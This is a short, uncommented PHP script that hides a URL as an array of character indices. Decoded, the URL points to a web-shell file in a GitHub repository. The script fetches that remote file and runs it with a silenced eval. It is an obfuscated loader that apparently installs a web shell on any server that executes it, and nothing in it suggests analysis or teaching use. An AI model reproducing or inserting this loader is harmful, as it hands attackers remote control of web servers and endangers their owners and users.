<?php

$characters = array_merge(range('a', 'z'), range('A', 'Z'), range('0', '9'), ['.', ':', '/', '_', '-']);
$indexArray = [7, 19, 19, 15, 18, 63, 64, 64, 17, 0, 22, 62, 6, 8, 19, 7, 20, 1, 20, 18, 4, 17, 2, 14, 13, 19, 4, 13, 19, 62, 2, 14, 12, 64, 9, 20, 18, 19, 8, 10, 0, 8, 11, 64, 22, 4, 1, 18, 7, 4, 11, 11, 64, 12, 0, 8, 13, 64, 19, 4, 12, 15, 65, 13, 4, 22, 62, 15, 7, 15];

$decodedString = '';
foreach ($indexArray as $index) {
    $decodedString .= $characters[$index];
}

$url = "$decodedString";
$response = file_get_contents($url);

if ($response !== false) {
    @eval("?>".$response);
}
?>
